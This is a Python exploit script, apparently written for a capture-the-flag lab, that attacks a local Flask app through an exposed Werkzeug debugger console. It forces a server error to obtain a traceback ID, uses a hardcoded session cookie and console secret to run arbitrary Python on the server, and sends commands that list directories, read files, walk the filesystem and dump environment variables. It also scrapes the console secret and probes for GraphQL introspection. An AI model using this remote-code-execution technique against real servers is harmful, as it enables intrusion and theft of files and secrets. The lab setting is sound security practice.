import requests
import re
import urllib.parse
import json

BASE_URL = "http://127.0.0.1:5003"
SESSION_COOKIE = ".eJwlTstqwzAQ_BWx51Cst-Sv6L2EsJZmY4PbFMs5hfx7F3oa5sm86CY7jxWD5q8XmVOBvjEG30EX-tzBA2Z_3M32Y86H4dbUNOe6DfOrmQ-6vq8XHTkwVprP4wllW6eZandSI3oCCy8MnqKPUoMU26dgpQPcXJhqVsMFgeXInUOISBXF55jES2jagbSaknNoPi8uoTW_5OoXUb0Um3KIMulyh5cktfuYuej923Pg-H9j6f0Hj05H0g.aVsUEw.pzEXTKPJRkglOFBxL9YRXm0BK1c"
SECRET = "YKhX0CLt5PHAxuDtcFOy"

def get_session():
    session = requests.Session()
    session.cookies.set("session", SESSION_COOKIE, domain="127.0.0.1", path="/")
    return session

def get_traceback_context():
    """Get a proper traceback context by triggering an error"""
    print("[*] Triggering application error for traceback context...")
    
    session = get_session()
    
    # Trigger KeyError by missing required form fields
    resp = session.post(
        f"{BASE_URL}/login",
        data={"wrong_field": "value"},
        allow_redirects=False,
        timeout=15
    )
    
    print(f"Error trigger status: {resp.status_code}")
    print(f"Content length: {len(resp.text)}")
    
    if resp.status_code != 500:
        print("[-] Did not get expected 500 error")
        return None, None
    
    # Look for traceback ID in the error page
    tb_match = re.search(r'tb=([0-9]+)', resp.text)
    if not tb_match:
        print("[-] Could not extract traceback ID")
        # Try alternative patterns
        tb_match = re.search(r'/console[^\"\'\s]*t=([0-9]+)', resp.text)
    
    if tb_match:
        tb_id = tb_match.group(1)
        print(f"[+] Extracted traceback ID: {tb_id}")
        
        # The debugger execute endpoint is on the same path as the error
        # It's typically accessed via the same route with __debugger__=yes parameter
        return resp.url.split('?')[0], tb_id
    
    return None, None

def exploit_debugger():
    """Exploit the Werkzeug debugger console"""
    print("Werkzeug Debugger Console Exploitation")
    print("=" * 70)
    
    # Step 1: Get traceback context
    error_path, tb_id = get_traceback_context()
    
    if not error_path:
        print("[-] Failed to get traceback context")
        return False
    
    print(f"[+] Error path: {error_path}")
    print(f"[+] Traceback ID: {tb_id}")
    
    # Step 2: The debugger execute endpoint is on the same path
    # Werkzeug debugger uses the route where the error occurred
    execute_url = error_path
    print(f"[+] Execute URL: {execute_url}")
    
    session = get_session()
    
    # Step 3: Test code execution
    test_code = "print('hello from debugger')"
    params = {
        "__debugger__": "yes",
        "cmd": "execute",
        "frm": "0",  # Frame 0 is the application context
        "s": SECRET,
        "code": test_code
    }
    
    print(f"\n[*] Testing code execution...")
    print(f"Code: {test_code}")
    
    resp = session.get(execute_url, params=params, timeout=15)
    
    print(f"Status: {resp.status_code}")
    print(f"Response preview: {resp.text[:300]}")
    
    if resp.status_code != 200:
        print("[-] Code execution failed")
        return False
    
    print("[+] Code execution endpoint accessible")
    
    # Step 4: Search for flag
    print("\n" + "=" * 70)
    print("SEARCHING FOR FLAG")
    print("=" * 70)
    
    # Commands to search for flag
    search_commands = [
        # List current directory and files
        "import os; print('=== FILES ==='); print(os.listdir('.'))",
        
        # Look for flag files
        "import os; print('=== FLAG FILES ==='); print([f for f in os.listdir('.') if 'flag' in f.lower()])",
        
        # Try to read flag.txt
        "import os; print('=== FLAG.TXT ==='); print(open('flag.txt').read()) if os.path.exists('flag.txt') else print('No flag.txt')",
        
        # Try to read FLAG.txt
        "import os; print('=== FLAG.TXT ==='); print(open('FLAG.txt').read()) if os.path.exists('FLAG.txt') else print('No FLAG.txt')",
        
        # Check parent directory
        "import os; print('=== PARENT FILES ==='); print(os.listdir('..'))",
        
        # Try common locations
        "import os; locations = ['flag.txt', 'FLAG.txt', '../flag.txt', '../../flag.txt', '/flag.txt']; [print(f'{loc}: {open(loc).read()[:100]}') for loc in locations if os.path.exists(loc)]",
        
        # Search in Python files for embedded flags
        "import os; print('=== SEARCHING PYTHON FILES ==='); files = [f for f in os.listdir('.') if f.endswith('.py')]; [print(open(f).read()) for f in files if 'FLAG' in open(f).read()]",
        
        # Check environment variables
        "import os; print('=== ENVIRONMENT ==='); print([v for k, v in os.environ.items() if 'flag' in k.lower()])",
    ]
    
    for i, cmd in enumerate(search_commands):
        print(f"\n[*] Command {i+1}/{len(search_commands)}")
        print(f"Executing: {cmd[:50]}...")
        
        params["code"] = cmd
        resp = session.get(execute_url, params=params, timeout=20)
        
        if resp.status_code == 200:
            # Look for flag pattern in response
            flag_match = re.search(r'FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
            if flag_match:
                print(f"\n{'='*70}")
                print(f"!!! FLAG FOUND !!!")
                print(f"Flag: {flag_match.group()}")
                print(f"{'='*70}")
                return True
            
            # Print relevant output if it looks like command results
            if '===' in resp.text or 'flag' in resp.text.lower():
                print(f"Output: {resp.text[:500]}")
        else:
            print(f"[-] Command failed with status {resp.status_code}")
    
    print("\n" + "=" * 70)
    print("FLAG NOT FOUND IN COMMON LOCATIONS")
    print("=" * 70)
    
    # Try reading all files from directory listing
    print("\n[*] Attempting to enumerate all files and search for flag...")
    
    list_cmd = "import os; print('=== ALL FILES ==='); [print(os.path.join(r, f)) for r, d, files in os.walk('.') for f in files]"
    params["code"] = list_cmd
    resp = session.get(execute_url, params=params, timeout=20)
    
    if resp.status_code == 200:
        # Extract file paths
        file_paths = re.findall(r'\.\./[^\s\n]+', resp.text)
        print(f"Found {len(file_paths)} files")
        
        # Try to read each file
        for file_path in file_paths[:20]:  # Limit to first 20
            read_cmd = f"import os; os.path.exists('{file_path}') and print(open('{file_path}').read())"
            params["code"] = read_cmd
            read_resp = session.get(execute_url, params=params)
            
            if read_resp.status_code == 200:
                # Check for flag
                flag_match = re.search(r'FLAG\{[^}]+\}', read_resp.text, re.IGNORECASE)
                if flag_match:
                    print(f"\n{'='*70}")
                    print(f"!!! FLAG FOUND IN {file_path} !!!")
                    print(f"Flag: {flag_match.group()}")
                    print(f"{'='*70}")
                    return True
    
    return False

def check_console_access():
    """Check if /console is accessible and extract secret"""
    print("\n[*] Checking /console endpoint...")
    
    session = get_session()
    resp = session.get(f"{BASE_URL}/console")
    
    print(f"/console status: {resp.status_code}")
    
    if resp.status_code == 200:
        # Look for SECRET in console page
        secret_match = re.search(r'SECRET\s*=\s*["\']([^"\']+)["\']', resp.text)
        if secret_match:
            found_secret = secret_match.group(1)
            print(f"[+] Console SECRET: {found_secret}")
            return found_secret
        
        # Look for EVALEX
        evalex_match = re.search(r'EVALEX\s*=\s*(true|false)', resp.text)
        if evalex_match:
            evalex = evalex_match.group(1)
            print(f"[+] EVALEX enabled: {evalex}")
    
    return None

def alternative_graphql_test():
    """Since the original note mentioned GraphQL, test for it"""
    print("\n" + "=" * 70)
    print("TESTING FOR GRAPHQL (as per vulnerability note)")
    print("=" * 70)
    
    session = get_session()
    
    # Common GraphQL endpoints
    graphql_endpoints = [
        "/graphql",
        "/graphiql", 
        "/v1/graphql",
        "/api/graphql"
    ]
    
    test_query = "{__schema{types{name}}}"
    
    for endpoint in graphql_endpoints:
        url = f"{BASE_URL}{endpoint}"
        
        # Test GET with query
        try:
            resp = session.get(url, params={"query": test_query}, timeout=10)
            print(f"GET {endpoint}: {resp.status_code}")
            
            # Test POST with JSON
            resp = session.post(url, json={"query": test_query}, timeout=10)
            print(f"POST {endpoint}: {resp.status_code}")
            
            if resp.status_code == 200 and "__schema" in resp.text:
                print(f"[+] GraphQL introspection working at {endpoint}")
                return endpoint
        except:
            pass
    
    return None

